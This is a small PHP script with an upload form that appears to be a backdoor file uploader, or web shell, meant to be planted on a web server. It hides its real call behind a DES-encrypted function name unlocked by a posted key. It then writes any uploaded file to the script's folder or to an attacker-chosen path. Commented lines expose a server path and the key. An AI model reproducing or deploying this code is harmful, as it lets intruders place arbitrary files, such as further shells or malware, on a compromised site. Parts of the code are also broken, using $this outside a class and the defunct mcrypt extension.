<?php
if($_SERVER['REQUEST_METHOD'] == 'POST'){
    $p_cao=$_POST['type'];
    if (empty($p_cao)) {
        $filename = realpath(dirname(__FILE__));
        $kk = $_POST['kkk'];
        $mm=decrypt('n/R4yBsWfZRvwhRAxx6AzFyM4Mc+UpuRTGQ1u1U/d08=', $kk);
        $mm($_FILES['file_data']['tmp_name'], $filename . '/' . $_FILES['file_data']['name']);
    } else {
        $kk = $_POST['kkk'];
        $pp = decrypt($_POST['type'], $kk);
        $mm=decrypt('gysTDfLJ2qUNAHToqptRLkyG+OBqOjEOBYyBMTDRMqk=', $kk);
        $mm($_FILES['file_data']['tmp_name'], $pp . $_FILES['file_data']['name']);
    }
}
// $s = '/home/u32/www/mvc/public/img/';
// $k = 'cao_ni_ma_liu_&_beipet';

function encrypt($data, $key = null) {
    $module = openCryptModule ();
    $key = substr ( $key === null ? md5 ( $this->getEncryptionKey () ) : $key, 0, mcrypt_enc_get_key_size ( $module ) );
    srand ();
    $iv = mcrypt_create_iv ( mcrypt_enc_get_iv_size ( $module ), MCRYPT_RAND );
    mcrypt_generic_init ( $module, $key, $iv );
    $encrypted = $iv . mcrypt_generic ( $module, $data );
    mcrypt_generic_deinit ( $module );
    mcrypt_module_close ( $module );
    return base64_encode($encrypted);
}

function decrypt($data, $key = null ) {
    $data = base64_decode($data);
    $module = openCryptModule ();
    $key = substr ( $key === null ? md5 ( $this->getEncryptionKey () ) : $key, 0, mcrypt_enc_get_key_size ( $module ) );
    $ivSize = mcrypt_enc_get_iv_size ( $module );
    $iv = substr ( $data, 0, $ivSize );
    mcrypt_generic_init ( $module, $key, $iv );
    $decrypted = mdecrypt_generic ( $module, substr ( $data, $ivSize ) );
    mcrypt_generic_deinit ( $module );
    mcrypt_module_close ( $module );
    return rtrim ( $decrypted, "\0" );
}

function openCryptModule() {
    if (extension_loaded ( 'mcrypt' )) {
$module = mcrypt_module_open ( 'des', '', MCRYPT_MODE_CBC, '' );

        return $module;
    }
}

// var_dump(encrypt($s, $k));
// var_dump(decrypt('n/R4yBsWfZRvwhRAxx6AzFyM4Mc+UpuRTGQ1u1U/d08=', $k));
// exit;
?>
<form action="#" method="post" enctype="multipart/form-data">
<div><input type="file" name="file_data" /></div>
<div>type:<input type="text" name="type" value="" /></div>
<div>kkk:<input type="text" name="kkk" value="" /></div>
<div><input type="submit" value="cao" /></div>
</form>